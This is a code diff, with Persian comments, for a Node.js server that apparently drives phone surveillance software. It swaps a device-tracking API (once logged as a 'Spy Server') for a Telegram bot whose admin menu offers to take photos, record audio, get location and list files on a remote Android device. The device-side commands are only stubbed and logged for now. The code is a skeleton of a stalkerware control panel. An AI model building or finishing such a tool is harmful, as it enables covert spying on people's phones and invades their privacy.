@@ -1,35 +1,51 @@
 const express = require('express');
 const cors = require('cors');
+const TelegramBot = require('node-telegram-bot-api');
 const app = express();
 const port = 3000;
 
-app.use(cors());
-app.use(express.json());
+// توکن رباتت رو اینجا مستقیم بنویس
+const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; 
+const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
-// ذخیره وضعیت دستگاه‌ها (در حافظه رم، برای پروژه کوچک کافی است)
-let devices = {};
+let devices = {}; // اینجا وضعیت دستگاه‌ها و دستورهای فعال رو نگه میداریم
 
-// API برای دریافت وضعیت از گوشی
-app.post('/update', (req, res) => {
-    const { deviceId, battery, location, status } = req.body;
-    
-    if (deviceId) {
-        devices[deviceId] = {
-            battery,
-            location,
-            status,
-            lastSeen: new Date()
-        };
-        console.log(`Device ${deviceId} updated.`);
-    }
-    res.json({ success: true });
+// وقتی /start زدی
+bot.onText(/\/start/, (msg) => {
+  const chatId = msg.chat.id;
+  
+  const keyboard = {
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: "📷 Take Photo", callback_data: "photo" }],
+        [{ text: "🎤 Record Audio", callback_data: "audio" }],
+        [{ text: "📍 Get Location", callback_data: "location" }],
+        [{ text: "📂 List Files", callback_data: "files" }]
+      ]
+    },
+    parse_mode: "HTML"
+  };
+
+  bot.sendMessage(chatId, "👋 <b>Welcome Admin!</b>\nSelect an action:", keyboard);
 });
 
-// API برای گرفتن لیست تمام دستگاه‌ها (برای پنل ادمین)
-app.get('/devices', (req, res) => {
-    res.json(devices);
+// وقتی روی دکمه‌ها کلیک می‌کنی
+bot.on('callback_query', (query) => {
+  const chatId = query.message.chat.id;
+  const action = query.data;
+  
+  bot.answerCallbackQuery(query.id); // حذف لودینگ دکمه
+  
+  console.log(`Admin requested: ${action}`);
+  
+  // اینجا یه پیام به خودت نشون میدیم که فهمیدیم کلیک کردی
+  bot.sendMessage(chatId, `✅ Command <b>${action}</b> sent to device.`);
+  
+  // نکته مهم: 
+  // در آینده اینجا کدی مینویسیم که به اندروید بگه "حالا دوربینت رو روشن کن!"
+  // فعلا فقط لاگ میکنیم
 });
 
 app.listen(port, () => {
-    console.log(`Spy Server running at http://localhost:${port}`);
+  console.log(`Server running on port ${port}`);
 });
